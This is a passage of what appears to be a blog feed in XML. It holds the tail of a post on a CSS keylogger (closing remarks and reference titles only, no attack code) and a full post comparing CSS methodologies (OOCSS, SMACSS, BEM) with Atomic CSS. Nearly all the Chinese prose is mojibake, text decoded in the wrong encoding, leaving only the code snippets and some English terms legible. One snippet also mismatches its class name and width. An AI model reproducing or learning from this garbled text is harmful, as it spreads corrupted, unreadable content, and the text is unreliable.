ç¸½çµä¸å¾—ä¸èªªï¼Œé€™å€‹æ‰‹æ³•çœŸçš„å¾ˆæœ‰è¶£ï¼ä¹‹å‰ç¬¬ä¸€æ¬¡çœ‹åˆ°çš„æ™‚å€™ä¹Ÿé©šå˜†äº†å¥½ä¸€é™£å­ï¼Œå±…ç„¶èƒ½ç™¼ç¾é€™æ¨£å­çš„ç´” CSS Keyloggerã€‚é›–ç„¶æŠ€è¡“ä¸Šæ˜¯å¯è¡Œçš„ï¼Œä½†åœ¨å¯¦ä½œä¸Šé‚„æ˜¯æœƒç¢°åˆ°è¨±å¤šå›°é›£ä¹‹è™•ï¼Œè€Œä¸”è¦ç¬¦åˆæ»¿å¤šå‰ææ‰èƒ½åšé€™æ¨£å­çš„æ”»æ“Šï¼Œä¸éé‚„æ˜¯å¾ˆå€¼å¾—é—œæ³¨å¾ŒçºŒçš„ç™¼å±•ã€‚
ç¸½ä¹‹å‘¢ï¼Œé€™ç¯‡æ–‡å°±æ˜¯æƒ³ä»‹ç´¹é€™å€‹æ±è¥¿çµ¦è®€è€…å€‘ï¼Œå¸Œæœ›å¤§å®¶æœ‰æ‰€æ”¶ç©«ã€‚
åƒè€ƒè³‡æ–™
Keylogger using webfont with single character unicode-range #24
Stop syncing value attribute for controlled inputs #11896
maxchehab&#x2F;CSS-Keylogging
Content-Security-Policy - HTTP Headers çš„è³‡å®‰è­°é¡Œ (2)
Stealing Data With CSS: Attack and Defense
Bypassing Browser Security Warnings with Pseudo Password Fields
CSS Keylogger (and why you shouldnâ€™t worry about it)
Mixpanel JS library has been harvesting passwords 

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>css</tag>
        <tag>key logger</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·ºè«‡ CSS æ–¹æ³•è«–èˆ‡ Atomic CSS</title>
    <url>/2017/04/29/css-methodology-atomiccss/</url>
    <content><![CDATA[See the Pen css-is-awesome by Arvin (@arvin0731) on CodePen.


ä»Šå¤©ä¾†é»è¼•é¬†çš„ï¼Œçœ‹æ¨™é¡Œå°±çŸ¥é“æˆ‘æƒ³ä»‹ç´¹ä¸€ä¸‹ Atomic CSSï¼Œé€™æ˜¯ä¸€å¥—ç”± Yahoo é–‹æºçš„ CSS å·¥å…·ï¼Œå·¥ä½œä¸Šä½¿ç”¨äº†è »é•·ä¸€æ®µæ™‚é–“ï¼Œä¸€é–‹å§‹ä½¿ç”¨èµ·ä¾†å…¶å¯¦è¦ºå¾—è »ä¸ç¿’æ…£çš„ï¼Œä½†æ˜¯ä¹…äº†ä»¥å¾Œç™¼ç¾æ­é… React å¯«èµ·ä¾†é›–ç„¶é†œäº†é»ä½†æ˜¯æ–¹ä¾¿åˆæ˜“æ‡‚ï¼Œéå¸¸é©åˆç¨ç«‹ä½œæ¥­çš„å‰ç«¯å·¥ç¨‹å¸«ï¼ˆè¨­è¨ˆå¸«ä¸åƒèˆ‡ HTML, CSS åˆ‡ç‰ˆç­‰å‹•ä½œï¼‰ï¼Œå¾…æˆ‘ç¨å¾Œæ…¢æ…¢èªªä¾†ã€‚
åœ¨ä»‹ç´¹ Atomic CSS ä¹‹å‰ï¼Œæˆ‘æƒ³é †ä¾¿è¤‡ç¿’ä¸€ä¸‹ç¾ä»Šçš„ CSS methodologyï¼Œä»¥åŠ React å‡ºç¾å¾Œå° CSS çš„å½±éŸ¿ï¼Œé€²è€Œå¸¶å‡º Atomic CSS æƒ³è§£æ±ºçš„å•é¡Œèˆ‡å…¶å¸¶ä¾†çš„å¥½è™•ã€‚å¾ŒçºŒçš„ä¸€äº›èªªæ˜å¤šåƒè€ƒè‡ªè¨±å¤šç¶²è·¯è³‡æºï¼Œé™„éŒ„åœ¨æ–‡ç« æœ€å¾Œé¢ã€‚
CSS æ¶æ§‹å¿ƒæ³•å‰›é–‹å§‹æ¥è§¸å‰ç«¯æ™‚ï¼Œå°æ–¼ CSS ä¹Ÿä¸å¤ªæœƒå»æ€è€ƒä»€éº¼æ¶æ§‹ï¼Œè¦ºå¾—å°±è‡ªå·± class name å‘½åæ¸…æ¥šä¸€é»ï¼Œæª”æ¡ˆæ•´ç†å¥½ä¸€é»å°±å¥½ï¼Œä½†æ˜¯é€™å¹¾ä¹åƒ…é©ç”¨æ–¼å°ˆæ¡ˆè¦æ¨¡é‚„ç®—å°çš„æ™‚å€™ï¼Œä¸€ä½†é–‹ç™¼çš„å°ˆæ¡ˆé¾å¤§èµ·ä¾†ï¼Œä¸¦ä¸”æœ‰å¤šä½å‰ç«¯å·¥ç¨‹å¸«åœ¨é€²è¡Œç¨‹å¼ç¢¼æ’°å¯«æ™‚ï¼Œå°±å¾ˆå®¹æ˜“é‡åˆ°å‘½åè¡çªã€stylesheet éæ–¼é¾å¤§ç­‰å•é¡Œï¼Œä¸»å› æ˜¯åœ¨ CSS çš„ä¸–ç•Œä¸­ï¼Œæ‰€æœ‰è¦å‰‡é›†éƒ½æ˜¯å…¨åŸŸçš„ã€‚ï¼ˆè¨»ï¼šè¦å‰‡é›† (ruleset) - ç”±ä¸€å€‹å®£å‘Šå€å¡Šæ‰€æ¶µæ‹¬çš„ä¸€æˆ–å¤šå€‹é¸æ“‡å™¨æ‰€çµ„æˆ, ex: modal-text &#123; color: #000, font-size: 12px &#125;ï¼‰
ç‚ºäº†æ›´åŠ æ˜ç¢ºçš„ç®¡ç† CSSï¼Œé–‹å§‹æœ‰äººæå‡ºä¸€äº› CSS çš„æ¶æ§‹å¿ƒæ³•ï¼Œæƒ³è®“ CSS ä¹Ÿèƒ½æœ‰è‰¯å¥½çš„é‡ç”¨æ€§ã€ç¶­è­·æ€§èˆ‡å»¶å±•æ€§ã€‚
æ¯”è¼ƒæœ‰åçš„ CSS æ¶æ§‹å¿ƒæ³•å¤§è‡´ä¸Šåˆ†ç‚ºé€™ä¸‰ç¨®ï¼š

OOCSS
SMACSS
BEM

æœ‰ä»½æµå‚³å·²ä¹…çš„æŠ•å½±ç‰‡åœ¨èªªæ˜é€™ä¸‰ç¨®å¿ƒæ³•ï¼šæ¼«è«‡ CSS æ¶æ§‹æ–¹æ³• - Kuro Hsu
é€™é‚Šæˆ‘å°±ç°¡å–®ç¯€éŒ„é‡é»ï¼š
OOCSS
èº«ç‚ºå·¥ç¨‹å¸«ï¼Œçœ‹åˆ° OO å…©å€‹å­—ä¸€å®šå°±æœƒæƒ³åˆ° Object-Oriented å§ï¼ŒOOCSS ä¸»æ„å°±åœ¨æ–¼å°‡ CSS ç‰©ä»¶åŒ–ã€æ¨¡çµ„åŒ–ï¼Œå…¶ä¸»è¦åŸå‰‡æœ‰å…©å€‹ï¼š
1. Separation of Structure from Skin: 
Structure å¯ä»¥çœ‹ä½œæ˜¯ CSS ä¸­å®šç¾©å…ƒç´ çš„ box-modal å¤§å°ã€margin èˆ‡ position çš„éƒ¨åˆ†ï¼Œè€Œ Skin è‡ªç„¶å°±æ˜¯è¡¨ç¾æ€§çš„ Styleï¼Œåƒæ˜¯é¡è‰²ã€å­—å‹å¤§å°ã€border-colorã€box-shadow ç­‰ç­‰ï¼Œåœ¨ OOCSS çš„åŸå‰‡ä¸­ï¼Œé€™å…©éƒ¨åˆ†çš„ CSS ä¸èƒ½æ··åˆåœ¨åŒä¸€å€‹è¦å‰‡é›†ä¸­ã€‚
Example:
ä¸€èˆ¬åœ¨å®šç¾©ä¸€å€‹ div çš„é•·ç›¸æ™‚ï¼Œç›´è¦ºå°±æœƒå¯«å‡ºä¸‹åˆ—é€™ç¨® CSSï¼Œæ ¹æ“šè©² div selector å®šç¾©å¥½å…¶å¤§å°ã€ä½ç½®èˆ‡é¡è‰²
#modal &#123;    width: 500px;    height: 500px;    box-sizing: border-box;    padding: 20px;    border: solid 1px #1ED3A9;    background: linear-gradient(#09D083, #1ED3A9);    box-shadow: rgba(0, 0, 0, .5) 2px 2px 5px;    overflow: hidden;    position: fixed;    top: 50%;    left: 50%;    transform: translateX(-50%);&#125;#button &#123;    width: 100px;    height: 30px;    box-sizing: border-box;    padding: 20px;    border: solid 1px #1ED3A9;    background: linear-gradient(#09D083, #1ED3A9);    box-shadow: rgba(0, 0, 0, .5) 2px 2px 5px;&#125;

è€Œ apply OOCSS çš„ç¬¬ä¸€åŸå‰‡å¾Œï¼Œå¯ä»¥ä¿®æ”¹æˆå¦‚ä¸‹ï¼Œå°‡å…±ç”¨çš„è¡¨ç¾å‹ Style æŠ½å–å‡ºä¾†ï¼Œä¸¦ä¸”ä»¥ class å–ä»£ id ä½œç‚º selectorï¼Œè®“å…¶å¯ä»¥ reuseï¼š
.modal &#123;    width: 500px;    height: 500px;    box-sizing: border-box;    padding: 20px;    position: fixed;    top: 50%;    left: 50%;    transform: translateX(-50%);&#125;.button &#123;    width: 100px;    height: 30px;    box-sizing: border-box;    padding: 20px;&#125;.defaultTheme &#123;    border: solid 1px #1ED3A9;    background: linear-gradient(#09D083, #1ED3A9);    box-shadow: rgba(0, 0, 0, .5) 2px 2px 5px;    overflow: hidden;&#125;

2. Separation of Containers and Content:
é—œæ–¼ OOCSS çš„ç¬¬äºŒåŸå‰‡ï¼Œç™½è©±ä¾†èªªå°±æ˜¯è¦æ±‚ä½ å°‡ css èˆ‡ html ç›¡é‡åˆ‡å‰²ï¼Œä»¥å¯å…±ç”¨çš„ class selector ä¾†å®šç¾© style ä¸¦æ”¾å…¥è©² html å…ƒç´ ä¸­ã€‚
Example:
å‡è¨­æˆ‘å€‘å®šç¾© Header id åº•ä¸‹çš„ h1 è¦æ˜¯å¦‚ä¸‹ styleï¼š
#header h1 &#123;    font-size: 2rem;    color: #1ED3A9&#125;

å‡è‹¥ä¹‹å¾Œæƒ³è¦åœ¨ä¸åŒåœ°æ–¹çš„ h1 æœ‰ä¸åŒé¡è‰²ï¼Œä½†åŒæ™‚ä¿æœ‰ç›¸åŒ size å‘¢ï¼Ÿä½ å¾—é€™æ¨£è¤‡å¯«ï¼š
#header h1, #footer h1 &#123;    font-size: 2rem;    color: #1ED3A9&#125;#footer h1 &#123;    color: red;&#125;
é€™æ¨£ä¸åƒ…æ˜¯æœ‰é‡è¤‡çš„ styleï¼Œæ›´æ˜¯é›£ä»¥ç¶­è­·ï¼Œä»¥ OOCSS çš„è§’åº¦ä¾†çœ‹ï¼Œè‹¥å°‡é€™äº›å…±ç”¨çš„ style å¦å¤–åŒ…æˆ classï¼Œæœ€å¾Œåœ¨ apply åˆ°éœ€è¦çš„ html ä¸Šï¼Œæœƒæ¸…æ¥šè¨±å¤šã€‚
&lt;div class=&quot;header commonFontSize&quot;&gt;&lt;/div&gt;&lt;div class=&quot;footer commonFontSize&quot;&gt;&lt;/div&gt;

.commonFontSize &#123;    font-size: 2rem;&#125;.header &#123;    color: #1ED3A9&#125;.footer &#123;    color: red;&#125;

OOCSS çš„æŒ‡æ¨™äººç‰© Nicole Sullivan æœ‰å€‹ media object çš„ reusable module ä»¥ oocss æ¦‚å¿µå¯¦ä½œï¼Œå¤§å®¶å¯ä»¥åƒè€ƒã€‚
ç¸½çµä¸€ä¸‹ OOCSS å„ªé»èˆ‡å¯¦ä½œæ–¹é‡ï¼š
å„ªé»ï¼šæ›´å°çš„ css sizeï¼Œèƒ½è®“ç¶²ç«™åŠ é€Ÿï¼›æ›´æ–¹ä¾¿ç®¡ç†æ¨¡çµ„åŒ–çš„ css stylesheetã€‚å¯¦ä½œæ–¹é‡ï¼šé¿å… descendent selector èˆ‡ id selectorï¼Œä½¿ç”¨ class ä¸¦ç›¡é‡èˆ‡ html å…ƒç´ ç¶å®šã€‚Donâ€™ do: #button h3, span.title
SMACSS
SMACSS æœ‰ç·šä¸Šçš„å®˜æ–¹é›»å­æ›¸ Scalable and Modular Architecture for CSS
çœ‹åç¨±å°±çŸ¥é“æ˜¯ä»¥æ•´é«”å°ˆæ¡ˆçš„ Architecture ä¾†è€ƒé‡ï¼Œèˆ‡ OOCSS æˆ‘è¦ºå¾—æ˜¯ç›¸åŒæ¦‚å¿µï¼Œåªæ˜¯é—œæ³¨é»çš„èµ·å§‹ä½ç½®ä¸åŒï¼Œå¾ä¸åŒç€è¦½å™¨å°æ–¼åŸºç¤å…ƒä»¶çš„ style å°±é–‹å§‹è€ƒé‡ï¼Œé™¤äº†èˆ‡ OOCSS ç›¸ä¼¼ä½†æœ‰è¦ç¯„çš„ çµæ§‹åˆ†é¡ èˆ‡ CSSèˆ‡HTMLåˆ†é›¢ï¼Œé‚„å¤šäº†å‘½åè¦å‰‡çš„é™åˆ¶ã€‚
çµæ§‹åˆ†é¡ï¼š
Base
Layout
Module
State
Theme

Base:å®šç¾©é é¢ä¸­HTML Elementçš„æœ€åŸºæœ¬Styleï¼ŒåŒ…å«CSS Reset(ä¸€è‡´åŒ–å„ç€è¦½å™¨è‡ªå®šç¾©çš„ style)ï¼Œå› æ­¤åªæœƒç”¨åˆ° element tag selectorã€‚
Layout:æ‰€è¬‚ Layout å°±æ˜¯å°‡é é¢åˆ‡å‰²å®šç¾©æˆä¸åŒçš„å€å¡Šï¼Œåƒæ˜¯ naviagtionã€headerã€sidebar ç­‰ç­‰ï¼Œç”±æ–¼é€™äº›å€å¡Šå¤§å¤šç¨ç«‹å‡ºç¾åœ¨é é¢ï¼Œå› æ­¤ç”¨ ID å®£å‘Šæ˜¯ ok çš„ï¼Œä½†è‹¥æ˜¯æœ‰é‡è¤‡å€å¡Šé¡å‹ï¼Œä½†ä¸åŒ styleï¼Œå‰‡å¯ä»¥æ¡ç”¨ class åŠ ä¸Š cascade ä¾†è™•ç†ã€‚
#sidebar &#123;    width: 30%;    float: right;&#125;.l-fixed #sidebar &#123;    width: 10%;&#125;

Module:Module åŸºæœ¬ä¸Šèˆ‡ Layout ç›¸åŒï¼Œéƒ½æ˜¯é é¢ä¸Šçš„å€å¡Šï¼Œåªæ˜¯åå‘æ–¼ Contentï¼Œä½†æ˜¯åš´ç¦ä½¿ç”¨ id æˆ–æ˜¯ element selectorï¼Œåªå‡†ä½¿ç”¨ class selectorï¼Œå¯ä»¥é€éå‘½åçš„æ–¹å¼ä¾†ç®¡ç†é€™äº› classï¼Œå³ Subclassing æˆ– Sub module:
.modal-body &#123; width: 100% &#125; /* ç”¨ dash åˆ†éš” class (subclassing/submodule)*/.modal-header &#123; height: 50px; width: 100% &#125;

State:State é¡§åæ€ç¾©å°±æ˜¯æ ¹æ“šå…ƒä»¶çš„ç‹€æ…‹çµ¦äºˆä¸åŒçš„ styleï¼Œå› æ­¤å‘½åä¸Šï¼Œé‡å°è©²ç‹€æ…‹çš„æè¿°è¶Šç²¾æº–è¶Šå¥½ï¼š
&lt;div class=&quot;modal-button active&quot;&gt;&lt;/div&gt;
.active &#123; color: red; &#125;

Theme:é€™å€‹å¾ˆå¥½æ‡‚ï¼Œå…¶å¯¦å°±æ˜¯é‡å°ç¶²ç«™ä¸»è¦–è¦ºå®šç¾©å¥½å„ç¨® Module æˆ–æ˜¯ Layout éœ€è¦çš„ Styleï¼Œåƒæ˜¯ Bootstrapã€Material-UI ä¸­ä¹Ÿæœ‰é¡ä¼¼æ¦‚å¿µã€‚
é€™é‚Šç¨ç‚ºç¸½çµä¸€ä¸‹ SMACSS çš„å„ªç¼ºï¼Œæ›´å¤šç´°ç¯€å¯ä»¥åƒè€ƒé›»å­æ›¸ï¼š
å„ªï¼š æ ¹æ“šçµæ§‹åˆ†é¡ï¼Œä¸¦å®šç¾©å‡º Base styleï¼Œæœ€å°åŒ–å„ç€è¦½å™¨çš„å·®ç•°ï¼Œéµå®ˆå…¶ Layoutã€Moduleã€State è¦å‰‡å¯ä»¥æœ‰è‰¯å¥½çš„é‡ç”¨æ€§èˆ‡ç¶­è­·æ€§ï¼Œä¸¦åˆ†é›¢ CSS èˆ‡ HTMLï¼Œé€²è€Œå¹«åŠ©ç°¡åŒ– selector æ·±åº¦ï¼Œå¢åŠ æ•ˆèƒ½ã€æ¸›å°‘ Sizeã€‚ç¼ºï¼šèˆ‡ OOCSS ä¸€æ¨£ï¼Œå¯èƒ½æœƒé€ æˆ Class å®šç¾©éå¤š
BEM
æœ€å¾Œä¸€å€‹å¿ƒæ³•æ˜¯ BEMï¼Œæ ¸å¿ƒè§€å¿µèˆ‡ç¾ä»Šæµè¡Œçš„ React, Vuejs ç›¸åƒï¼Œå¼·èª¿æ¨¡çµ„åŒ–èˆ‡ css çš„é‡è¤‡åˆ©ç”¨æ€§ï¼Œå› æ­¤åªä½¿ç”¨ Class selectorï¼Œä»¥å…¶ç‰¹æœ‰çš„å‘½åè¦å‰‡ä¾†è¦ç¯„ã€‚ä¸åƒå…ˆå‰ OOCSS æˆ– SMACSS çš„ class å¯èƒ½æœƒè®“ä½ å‘½åå‡º MargintTop-10 é€™æ¨£ä»¥ skin ç‚ºä¸»çš„ class nameï¼ŒBEM ä»¥åŠŸèƒ½å°å‘ä¾†å‘½åï¼Œå°‡ç¶²é çµ„æˆåˆ†ç‚º Block, Element, Modifierã€‚
Blockï¼šå°±æ˜¯ä¸€å€‹ç¨ç«‹ä¸¦å¯é‡è¤‡ä½¿ç”¨çš„é é¢å…ƒä»¶ï¼Œå¦‚åŒ SMACSS çš„ Layout&#x2F;Moduleï¼Œå‘½åè‹¥æœ‰éœ€è¦å‰‡ä»¥ dash (-) ä¸²æ¥.search-field &#123;...&#125;ã€‚
Elementï¼šæ˜¯ Block ä¸­ä¸å¯åˆ†é›¢çš„å°å…ƒä»¶ï¼Œä¸€å®šå­˜åœ¨æ–¼ Block ä¸‹ï¼Œä½† Block ä¸ä¸€å®šæœƒæœ‰ Elementã€‚å› ç‚ºä¸€å®šå­˜åœ¨æ–¼ Block ä¸­ï¼Œå› æ­¤å‘½åæœƒä¸€å®šæœ‰ Block Name ä½œç‚º prefixï¼Œä»¥é›™åº•ç·šåˆ†éš” :
.search-field__button {â€¦}

Modifierï¼šç”¨ä¾†å®šç¾© Block æˆ– Element çš„ç‹€æ…‹æˆ–å±¬æ€§ï¼Œåƒæ˜¯ SMACSS çš„ Stateï¼Œå¯ä»¥å¤šå€‹ modifier åŒæ™‚å­˜åœ¨æ–¼ Block èˆ‡ Element ä¸­ã€‚å‘½åå‰‡ä»¥ Block æˆ– Element name ä½œç‚º prefixï¼Œä»¥å–®åº•ç·šåˆ†éš”
.search-field__button_hover {â€¦}
å¦å¤–ï¼ŒBEM ç”šè‡³æå‡ºäº†ä¾ç…§ BEM çš„æ¶æ§‹ä¾†å€åˆ† file structureï¼šï¼ˆæˆªåœ–è‡³å®˜ç¶²ï¼‰
çµè«–èˆ‡è½‰æŠ˜CSS å¿ƒæ³•é™¤äº†ä¸Šè¿°ä¸‰ç¨®ä»¥å¤–ï¼Œå…¶å¯¦é‚„æœ‰ SUIT CSS ç­‰ç­‰ï¼Œä¸éå°±å¤§åŒå°ç•°ï¼Œä¸»è¦éƒ½æ˜¯å¸Œæœ›æé«˜ CSS çš„é‡ç”¨æ€§ã€å¯ç¶­è­·æ€§èˆ‡å»¶å±•æ€§ï¼Œç™¼å±•è‡³æ­¤ä¼¼ä¹è¶¨æ–¼ç©©å®šï¼Œæ­é… SASS ç­‰å·¥å…·å¹¾ä¹å·²ç¶“èƒ½å¾ˆå¥½çš„ç®¡ç† CSS äº†ï¼Œä½†æ˜¯å¾ React å‡ºä¾†ä»¥å¾Œï¼Œå…¶æ¨è–¦çš„ CSS in JS æ ¹æœ¬æ‰“ç¿»äº†ä¸Šè¿°çš„å“²å­¸ï¼Œæ—¢ç„¶è¦ç”¨ JS ä¾†å¯« componentï¼Œé‚£ CSS ç›´æ¥ç”¨ inline-style çš„æ–¹å¼å¯«åœ¨ jsx ä¸­ï¼Œå°±ä¸ç”¨è¨˜ä¸€å †æœ‰çš„æ²’çš„å‘½åè¦å‰‡ï¼Œåˆä¸ç”¨æ“”å¿ƒå…¨åŸŸè®Šæ•¸å½±éŸ¿ï¼Œå¤šæ£’å•Šï¼
ä½†å¾ä¾†æ²’æœ‰å®Œç¾çš„è§£æ³•ï¼Œæœ‰å¾ˆå¤šäººè¨å­é€™æ¨£çš„åšæ³•ï¼Œæ‰€ä»¥å‡ºç¾äº† Radim æˆ– CSS-module é€™æ¨£çš„æ±è¥¿ï¼Œç®—æ˜¯è »å®Œç¾çš„åˆ©ç”¨ Scoped cssä¾†åšåˆ°æ“æœ‰åŸå§‹ css style ä½¿ç”¨å½ˆæ€§çš„ CSS in JSã€‚
ä¸ç®¡æ˜¯ç”¨å“ªç¨®æ–¹å¼ï¼Œæœå‘æ¨¡çµ„åŒ–ã€Scoped CSS çš„æ–¹å‘çœ‹ä¾†éƒ½æ˜¯ä¸è®Šçš„ã€‚
Atomic CSS
æ—¢ç„¶æˆ‘å€‘è¤‡ç¿’äº† CSS å¿ƒæ³•ï¼Œä¹Ÿäº†è§£åˆ°ç›®å‰å› æ‡‰ React çš„ç™¼å±•è€Œå‡ºç¾çš„ CSS-module ç­‰æ–¹å¼ï¼Œæˆ‘å€‘å°±å¯ä»¥ä¾†ä»‹ç´¹ä¸€ä¸‹ç”± Yahoo é€™å€‹æ›¾ç¶“çš„ç¶²è·¯å·¨äººæ‰€é–‹æºçš„ Atomic CSS å§ï¼
é€™é‚Šè¦ç‰¹åˆ¥èªªæ˜ä¸€ä¸‹ï¼ŒAtomic CSS ä¸¦ä¸æ˜¯ä¾†è§£æ±ºä¸Šè¿°å¿ƒæ³•çš„ç¼ºé»ï¼Œè¦è§£æ±ºçš„å•é¡Œéƒ½é›·åŒï¼Œéƒ½æ˜¯å¸Œæœ›èƒ½è®“ CSS åœ¨å¤§å‹å°ˆæ¡ˆä¸‹èƒ½æ“æœ‰æ›´å¥½çš„é‡ç”¨æ€§èˆ‡ç¶­è­·æ€§ï¼Œåªæ˜¯æ¡ç”¨çš„æ–¹æ³•èˆ‡é¢å‘ä¸åŒç½·äº†ã€‚
é€éå‰è¿°å¿ƒæ³•æˆ‘å€‘å¯ä»¥åˆ©ç”¨ class selector çš„æ–¹å¼ä¾†è™•ç†å‘½åè¡çªçš„éº»ç…©ï¼Œä½†æ˜¯é‚„æœ‰å¯èƒ½é€ æˆ stylesheet éå¤§ï¼Œå› ç‚ºä½ å¯èƒ½æœƒä¾æ“šä¸åŒ component ä¾†è¨­ç½®ä¸åŒçš„ namespaceï¼Œè€Œä¸”ä¸€å€‹ä¸å°å¿ƒï¼Œè‹¥ CSS éšå±¤è¶Šå¤šï¼Œæ•ˆèƒ½å°±æœƒè¶Šå·®ã€‚åŠ ä¸Šä¸åŒåœ˜éšŠä¸€èµ·é–‹ç™¼æ™‚ï¼Œå¯èƒ½é‚„æœƒæœ‰ä¸åŒå‘½åï¼Œå»æœ‰ç›¸åŒæ•ˆæœï¼š
block1__text_highlight &#123;  color: yellow;&#125;...block2__text_bright &#123;  color: yellow;&#125;

å› æ­¤ Atomic CSS æå‡ºå¦ä¸€ç¨®è§€é»ï¼š
å°‡ CSS style æœ€å°å…ƒä»¶åŒ–ï¼Œé‡ç”¨æ€§æœ€å¤§åŒ–åªè¦ç¢ºä¿åŒä¸€å€‹ style æ°¸é åªæœƒè¢«å®šç¾©ä¸€æ¬¡ï¼Œä¸¦ä¸”å¯ä»¥é‹ç”¨åœ¨å„å€‹åœ°æ–¹ï¼Œå°±èƒ½è§£æ±ºé€™äº›å•é¡Œï¼
å¯¦éš›ä½œæ³•å°±çœ‹ä¸€ä¸‹ç¯„ä¾‹å§ï¼š
&lt;div class=&quot;D(f) W(100px)&quot;&gt;&lt;/div&gt;

åˆ©ç”¨ Atomic css çš„å·¥å…·ï¼Œæœƒå¹«ä½ å°‡ä¸Šè¿° html ä¸­çš„ class name è§£ææˆï¼š
.D\(f\) &#123;  display: flex;&#125;.W\(300px\) &#123;  width: 100px;&#125;

æ‡‰è©²å¾ˆæ·ºé¡¯æ˜“æ‡‚å§ï¼D(f) å°æ‡‰åˆ° display:flex é€™å€‹ styleï¼Œä¹Ÿå°±æ˜¯èªªï¼ŒAtomic ä»¥ä¸€ç¨® css style ä½œç‚º class name çš„æœ€å°å–®ä½ã€‚
å†ç¨å¾®æƒ³ä¸€ä¸‹ä½ å°±æœƒç™¼ç¾ï¼Œé€™æ ¹æœ¬å°±æ˜¯åœ¨å¯« inline-styleï¼Œåªæ˜¯æˆ‘å€‘ç”¨ class name çš„æ–¹å¼ä¾†è¡¨ç¤ºè€Œå·²å•Šï¼
æ²’éŒ¯ï¼Œä½†é€™æ¨£åšçš„å¥½è™•å°±æ˜¯å¯ä»¥ Define once, use everywhere.
ä»Šå¤©ä½ å°±ç®—æœ‰å¦ä¸€å€‹ div ä¹Ÿæƒ³è¦æœ‰ display:flex çš„å±¬æ€§ï¼Œåªè¦åŠ ä¸Š D(f) é€™å€‹ class name å°±å¯ä»¥äº†ï¼ŒåŒæ¨£ styleï¼Œä¸ç”¨é‡è¤‡å®šç¾© class nameï¼
åœ¨å¤§å‹å°ˆæ¡ˆå…§ï¼Œä½ çš„å…ƒä»¶è¶Šå¤šã€é‡è¤‡çš„å±¬æ€§ç”¨å¾—è¶Šå¤šï¼Œç›¸å°æ–¼å…¶ä»–å¿ƒæ³•ï¼Œä½ å°±å¯èƒ½çœä¸‹æ›´å¤š Sizeï¼
è€Œä¸”é€™æ¨£çš„å¯«æ³•ï¼Œæ­é… React çœŸçš„å¾ˆæ–¹ä¾¿ï¼Œä¹Ÿç¬¦åˆåŸå…ˆ CSS in JS çš„æ¦‚å¿µï¼Œé€éä¸²æ¥å¤šå€‹ â€œAtomic Classâ€ çš„æ–¹å¼åœ¨å…ƒç´ ä¸Šä¾†é”åˆ°åŸå…ˆ css style çš„æ•ˆæœã€‚
ä¾†çœ‹å€‹å¯¦éš›çš„ Exampleï¼š
import React from &#x27;react&#x27;;class Modal extends React.Component &#123;    render() &#123;        return (            &lt;div className=&quot;P(10px) M(20%) Pos(f) Start(50%) Bgc(#fff)&quot; /&gt;        );    &#125;&#125;;export default Modal;

Atomic css tool parsed éçš„ css
.Bgc\(#fff\) &#123;  background-color: #ffffff;&#125;.M\(20\%\) &#123;  margin: 20%;&#125;.Pos\(f\) &#123;  position: fixed;&#125;.Start\(50%\) &#123;  left: 50%;&#125;.P\(10px\) &#123;  padding: 10px;&#125;

æœ‰ç™¼ç¾å—ï¼Ÿå¾æ­¤ä»¥å¾Œä½ è¦çœ‹ä¸€å€‹ component çš„æ™‚å€™ï¼Œå¯ä»¥ç›´æ¥å¾ jsx æª”æ¡ˆä¸­çœ‹å®Œæ•´å€‹å…ƒä»¶çš„ç‹€æ…‹èˆ‡æ¨£å¼ï¼Œä¸ç”¨å†åˆ‡æ› jsx èˆ‡ css æª”æ¡ˆäº†ï¼Œè€Œä¸”é€éé€™æ¨£çš„ class name å‘½åï¼Œåªè¦ç¨å¾®ç†Ÿæ‚‰ä»¥å¾Œï¼Œå°±è¶…ç´šå¥½æ‡‚é€™å€‹ div ç”¨äº†å“ªäº› styleã€‚ï¼ˆå°±ç®—ä¸æ‡‚ï¼Œå®˜ç¶²ä¹Ÿæœ‰å¾ˆæ–¹ä¾¿çš„æŸ¥é–±å·¥å…·ï¼‰ã€‚
æœ€å¾Œåˆ—èˆ‰ä¸€ä¸‹å„ªé»ï¼š

å°‡ class name å®šç¾©æœ€å°åŒ–ï¼Œè®“å…¨ç«™éƒ½èƒ½é‡è¤‡ä½¿ç”¨ã€‚
é€é Atomic CSS çš„ parserï¼ˆor webpack loaderï¼‰ï¼Œåªæœƒç”¢ç”Ÿä½ æœ‰ä½¿ç”¨åˆ°çš„ classname çš„ stylesheetã€‚
æ¯”èµ· inline style çš„å¯«æ³•æ›´ç°¡æ½”ï¼Œåˆä¸æœƒæœ‰å‘½åè¡çªã€‚
åŠ ä¸Šæ­¤ç¨® class name å¾ˆå¥½å£“ç¸®ï¼Œæ•´é«” size å¯ä»¥å¾ˆå°ã€‚
æ­é… Reactï¼Œå¾æ­¤ component çš„ç‹€æ…‹èˆ‡æ¨£å¼åˆç‚ºä¸€é«”ã€‚

æˆ‘çŸ¥é“æœƒæœ‰å¾ˆå¤šäººè¦ºå¾—é€™æ¨£é•åç›´è¦ºã€å¯«èµ·ä¾†å¾ˆé†œã€æ²’æœ‰èªæ„åŒ–ç­‰ç­‰ï¼Œæˆ‘ä¸€é–‹å§‹ä¹Ÿé–ƒéé€™ç¨®å¿µé ­ï¼Œä½†æ˜¯èº«ç‚ºå·¥ç¨‹å¸«ï¼Œæˆ‘å€‘æ“…é•·æ‰“ç ´å¸¸è¦ã€åˆ©ç”¨å‰µæ„ä¾†è§£æ±ºå•é¡Œã€‚é€™äº› class name çš„ç¢ºä¸èªæ„åŒ–ï¼Œä½†æ˜¯èº«ç‚ºå·¥ç¨‹å¸«ï¼Œæˆ‘æƒ³æˆ‘å€‘æ“…é•·ç†è§£é€™äº›ä»£è™Ÿã€‚å¯«ç¨‹å¼éƒ½çŸ¥é“ï¼Œèªè¨€åªæ˜¯å·¥å…·ï¼Œé‚è¼¯æ‰æ˜¯é‡é»ï¼Œå¦‚æœå¯ä»¥é¿å…ï¼Œå¯ä»¥ä¸å¿…èŠ±é€™éº¼å¤šæ™‚é–“åœ¨æ€è€ƒå‘½åã€‚
ç•¶ç„¶ï¼Œä»¥ä¸Šåªæ˜¯æˆ‘çš„è§€é»å•¦ï½æ¨è–¦å¤§å®¶è©¦ç”¨çœ‹çœ‹ï¼
åŒå ´åŠ æ˜ å¦ä¸€å€‹é¡ä¼¼æ¦‚å¿µï¼Œä½†è™•ç†æ©Ÿåˆ¶ä¸å¤ªç›¸åŒçš„ Tachyons css
